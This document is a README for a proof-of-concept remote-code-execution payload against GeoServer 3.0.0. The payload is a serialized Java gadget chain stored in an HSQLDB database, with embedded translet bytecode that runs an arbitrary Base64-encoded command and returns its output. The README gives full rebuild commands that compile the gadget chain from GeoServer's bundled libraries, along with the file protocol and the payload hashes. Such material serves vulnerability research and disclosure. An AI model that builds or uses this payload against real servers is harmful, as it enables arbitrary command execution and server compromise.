# Static payload

The files beside `payload-src` are a closed HSQLDB database containing the serialized object graph used by the PoC:

- `payload.properties` records the database state and contains `modified=no`.
- `payload.script` contains the schema, data, serialized graph, and embedded `CommandTranslet` bytecode.

The source files are:

- `CommandTranslet.java`: resolves the exact `jdbc_geoserver_poc` service and pool, derives the random `gs-rce-<token>` staging directory from its JDBC URL, reads and claims `request.txt`, runs the command, publishes `result.txt`, then reports pool closure in `cleanup.txt`.
- `GeneratePayload.java`: builds the serialized graph and writes the closed HSQLDB database.

`request.txt` has exactly two LF-terminated lines. The first is the 32-character lowercase hexadecimal token from the staging directory. The second is standard Base64 for a non-empty printable-ASCII command of at most 512 bytes. `request.claimed` prevents a later deserialization in a fresh class loader from running the command again.

`result.txt` contains `token`, `command_b64`, `exit_code`, `timed_out`, `output_truncated`, and `output_b64`. Combined standard output and standard error are capped at 1 MiB. `cleanup.txt` contains the same `token` and `pool_closed`. The client also checks that `payload.lck` is absent and `payload.properties` contains `modified=no` before removing the staging directory.

## Distributed files

| File | Bytes | SHA-256 |
| --- | ---: | --- |
| `payload.properties` | 100 | `cea09c790573ac08982628851553805c10f263e1e93c180bff25d67ddb32db0a` |
| `payload.script` | 31,767 | `77881e0aef88d22726fbd8e1056789ab721409c43acb4d811cec8efffc36052f` |
| Embedded `CommandTranslet.class` | 12,696 | `6f7f8122d5945739d107dd14b735c8fddc13051dff0f16b2e6cb9bcdf5c90535` |

## Rebuild

Run these commands from `payload-src`. Set `GEOSERVER_WAR_ROOT` to the absolute path of an exploded official GeoServer 3.0.0 WAR and adjust `JDK17_BIN` only if Java 17 is installed elsewhere.

```sh
PAYLOAD_SOURCE="$(pwd)"
GEOSERVER_WAR_ROOT=/absolute/path/to/exploded/geoserver-war
JDK17_BIN=/usr/lib/jvm/java-17-openjdk-amd64/bin
PAYLOAD_BUILD="$(mktemp -d)"
PAYLOAD_LIB="$GEOSERVER_WAR_ROOT/WEB-INF/lib"
PAYLOAD_CP="$PAYLOAD_LIB/commons-beanutils-1.11.0.jar:$PAYLOAD_LIB/commons-collections-3.2.2.jar:$PAYLOAD_LIB/hsqldb-2.7.2.jar:$PAYLOAD_LIB/spring-aop-7.0.8.jar:$PAYLOAD_LIB/spring-beans-7.0.8.jar:$PAYLOAD_LIB/spring-core-7.0.8.jar:$PAYLOAD_LIB/commons-logging-1.3.5.jar"

mkdir -p "$PAYLOAD_BUILD/classes"

"$JDK17_BIN/javac" \
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED \
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-exports java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED \
  --add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED \
  -d "$PAYLOAD_BUILD/classes" \
  "$PAYLOAD_SOURCE/CommandTranslet.java"

"$JDK17_BIN/javac" \
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  -cp "$PAYLOAD_CP" \
  -d "$PAYLOAD_BUILD/classes" \
  "$PAYLOAD_SOURCE/GeneratePayload.java"

"$JDK17_BIN/java" \
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens java.base/java.util=ALL-UNNAMED \
  -cp "$PAYLOAD_BUILD/classes:$PAYLOAD_CP" \
  GeneratePayload \
  "$PAYLOAD_BUILD/classes/die/verwandlung/CommandTranslet.class" \
  "$PAYLOAD_BUILD/payload"

sha256sum \
  "$PAYLOAD_BUILD/classes/die/verwandlung/CommandTranslet.class" \
  "$PAYLOAD_BUILD/payload.properties" \
  "$PAYLOAD_BUILD/payload.script"
```

HSQLDB records generation metadata, so rebuilt database hashes can differ even when the compiled translet bytes are identical.
